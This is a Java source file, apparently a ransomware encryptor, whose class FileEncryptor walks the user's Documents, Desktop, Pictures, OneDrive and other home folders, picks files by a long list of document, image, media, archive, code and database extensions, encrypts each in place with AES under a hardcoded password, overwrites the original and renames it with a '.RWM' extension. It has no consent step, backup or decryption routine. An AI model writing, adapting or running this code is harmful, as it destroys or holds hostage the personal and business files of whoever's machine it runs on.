import java.io.*;
import java.nio.file.*;
import java.security.*;
import java.security.spec.KeySpec;
import java.util.*;
import java.util.stream.*;
import javax.crypto.*;
import javax.crypto.spec.*;

public class FileEncryptor {

    private static final String PASSWORD = "password123";
    private static final String EXTENSION = ".RWM";

    private static final String[] TARGET_EXTENSIONS = {
        // Documents & Office
        ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".rtf", ".txt", ".odt", ".ods", ".odp", ".tex", ".log", ".csv", ".accd", ".accdb", ".pptm",

        // Images
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".psd", ".ai", ".svg", ".raw", ".cr2", ".nef",

        // Audio
        ".mp3", ".wav", ".flac", ".midi", ".ogg",

        // Video
        ".avi", ".mov", ".mp4", ".mpeg", ".mpeg2", ".mpeg3", ".mpg", ".mkv", ".flv", ".3gp", ".m4v", ".wmv",

        // Archives & Backups
        ".zip", ".rar", ".7z", ".tar", ".gz", ".bak", ".backup", ".wbcat",

        // Code & Developer Files
        ".py", ".html", ".htm", ".php", ".js", ".css", ".cpp", ".c", ".java", ".cs", ".vb", ".asp", ".aspx", ".cgi", ".pl",

        // Databases
        ".sql", ".db", ".dbf", ".mdb", ".accdb", ".accd"
    };

    private static final String[] TARGET_FOLDERS = {
        "Documents",
        "Downloads",
        "Favorites",
        "Links",
        "Music",
        "Pictures",
        "Saved Games",
        "Videos",
        "OneDrive",
        "Desktop"
    };

    public static void main(String[] args) {
        System.out.println("---------------------------");
        startEncrypting();
        System.out.println("---------------------------");
    }

    public static void startEncrypting() {
        String userHome = System.getProperty("user.home");

        for (String folderName : TARGET_FOLDERS) {
            Path folderPath = Paths.get(userHome, folderName);
            if (!Files.exists(folderPath)) continue;

            try (Stream<Path> files = Files.walk(folderPath)) {
                files.filter(Files::isRegularFile)
                     .filter(FileEncryptor::isTargetExtension)
                     .forEach(path -> {
                         try {
                             Path encryptedPath = encryptFile(PASSWORD, path);
                             System.out.println("SUCCESS: File Encrypted: " + encryptedPath);
                         } catch (Exception e) {
                             System.err.println("FAILED: " + path + " -> " + e.getMessage());
                         }
                     });
            } catch (IOException | UncheckedIOException e) {
                System.err.println("Skipping folder (access denied): " + folderPath + " -> " + e.getMessage());
            }
        }
    }

    private static boolean isTargetExtension(Path path) {
        String filename = path.getFileName().toString().toLowerCase();
        return Arrays.stream(TARGET_EXTENSIONS)
                .anyMatch(filename::endsWith);
    }

    private static Path encryptFile(String password, Path filePath) throws Exception {
        byte[] salt = SecureRandom.getInstanceStrong().generateSeed(16);
        byte[] iv = SecureRandom.getInstanceStrong().generateSeed(16);

        SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA256");
        KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 10, 256); // 10 hash(hash(hash))/AKA hash loop
        SecretKey tmp = factory.generateSecret(spec);
        SecretKeySpec key = new SecretKeySpec(tmp.getEncoded(), "AES");

        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        IvParameterSpec ivSpec = new IvParameterSpec(iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, ivSpec);

        byte[] fileBytes = Files.readAllBytes(filePath);
        byte[] cipherText = cipher.doFinal(fileBytes);

        byte[] encryptedData = new byte[salt.length + iv.length + cipherText.length];
        System.arraycopy(salt, 0, encryptedData, 0, salt.length);
        System.arraycopy(iv, 0, encryptedData, salt.length, iv.length);
        System.arraycopy(cipherText, 0, encryptedData, salt.length + iv.length, cipherText.length);

        Files.write(filePath, encryptedData, StandardOpenOption.TRUNCATE_EXISTING);

        Path newPath = Paths.get(filePath.toString() + EXTENSION);
        return Files.move(filePath, newPath, StandardCopyOption.REPLACE_EXISTING);
    }
}
